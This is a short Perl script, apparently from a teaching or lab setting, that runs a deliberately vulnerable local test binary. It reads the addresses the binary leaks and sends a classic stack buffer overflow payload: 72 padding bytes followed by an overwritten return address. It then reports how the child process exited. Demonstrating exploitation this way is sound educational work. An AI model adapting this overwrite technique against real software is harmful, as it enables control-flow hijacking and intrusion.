#!/usr/bin/perl

use IPC::Open2;
use POSIX qw(:signal_h :errno_h :sys_wait_h);

my $vuln = '../test/vuln';
$vuln = $ARGV[0] if @ARGV > 0;

# spawn vulnerable target, getting handles for both stdin and stdout
print "spawn child process {$vuln}\n";
my $pid = open2(my $chld_out, my $chld_in, $vuln);

# parse the first line of output, which contains address information
my $first = <$chld_out>;
chomp $first;
print "child wrote {$first}\n";
$first =~ /buf is at (\S+), target is at (\S+)/ or die;  # parse line
my $address = hex($2);
my $address_str = '';
for my $i (0..7) {
    $address_str .= chr($address & 0xff);
    $address >>= 8;
}

# construct an exploit: 64 byte buffer, 8 byte base pointer, return address
my $exploit = 'A'x(64+8) . $address_str;
print "exploit is {$exploit}\n";
print $chld_in $exploit;  # write exploit to process
close $chld_in;  # force flush of stream

# read remaining output from program
while(my $line = <$chld_out>) {
    chomp $line;
    print "child process output {$line}\n";
}

# wait for exit status
waitpid( $pid, 0 );
if(WIFEXITED($?)) {
    my $exit_status = $? >> 8;
    print "child exited with status $exit_status\n";
} 
elsif(WIFSIGNALED($?)) {
    my $sig = WTERMSIG($?);
    print "child died with signal $sig\n";
}
else {
    print "child exited with unknown exception\n";
}
